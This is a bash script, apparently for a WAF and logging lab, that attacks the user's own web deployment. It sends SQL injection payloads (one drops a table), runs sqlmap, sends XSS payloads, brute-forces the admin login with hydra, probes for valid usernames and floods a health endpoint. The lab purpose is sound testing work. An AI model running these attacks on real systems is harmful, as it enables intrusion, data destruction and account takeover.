#!/usr/bin/env bash
# Run from YOUR Kali VM against YOUR OWN deployment only.
# Usage: CONFIRM_OWN_TARGET=yes ./run_attacks.sh http://<alb-dns>
set -u
TARGET=${1:?usage: CONFIRM_OWN_TARGET=yes $0 http://alb-dns}
[ "${CONFIRM_OWN_TARGET:-}" = "yes" ] || { echo "Set CONFIRM_OWN_TARGET=yes (only attack systems you own)."; exit 1; }
HOST=$(echo "$TARGET" | sed -E 's#https?://##; s#/.*##')
LOG=attack-$(date -u +%Y%m%dT%H%M%SZ).log
note(){ echo "[$(date -u +%FT%TZ)] $*" | tee -a "$LOG"; }

note "=== 1. Manual SQLi probes (note exact times for log correlation) ==="
for p in "' OR '1'='1" "' UNION SELECT NULL,username,NULL FROM users--" "1; DROP TABLE products--"; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -G "$TARGET/api/search" --data-urlencode "q=$p")
  note "SQLi payload [$p] -> HTTP $code"
done

note "=== 2. sqlmap against /api/search ==="
sqlmap -u "$TARGET/api/search?q=phone" --batch --level=2 --risk=1 --random-agent --flush-session 2>&1 | tail -n 30 | tee -a "$LOG"

note "=== 3. XSS payloads ==="
for p in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "\"><svg/onload=alert(1)>"; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -G "$TARGET/api/search" --data-urlencode "q=$p")
  note "XSS payload [$p] -> HTTP $code"
done

note "=== 4. Brute force /api/login with hydra (weak login: expect it to get PAST the WAF) ==="
printf 'admin123\nletmein\npassword\n123456\nqwerty\nadmin\n' > /tmp/pw.txt
hydra -l admin -P /tmp/pw.txt "$HOST" http-post-form "/api/login:username=^USER^&password=^PASS^:F=wrong password:H=Content-Type\: application/x-www-form-urlencoded" -s 80 2>&1 | tail -n 15 | tee -a "$LOG"
note "Direct JSON login test:"
curl -s -X POST "$TARGET/api/login" -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}' | tee -a "$LOG"; echo
note "Username enumeration:"
curl -s -X POST "$TARGET/api/login" -H 'Content-Type: application/json' -d '{"username":"nobody","password":"x"}' | tee -a "$LOG"; echo

note "=== 5. Rate-limit burst (300 requests) ==="
for i in $(seq 1 300); do curl -s -o /dev/null -w '%{http_code}\n' "$TARGET/api/health"; done | sort | uniq -c | tee -a "$LOG"
note "Done. Log saved to $LOG. Now run attacks/logs_insights_queries.md in CloudWatch."
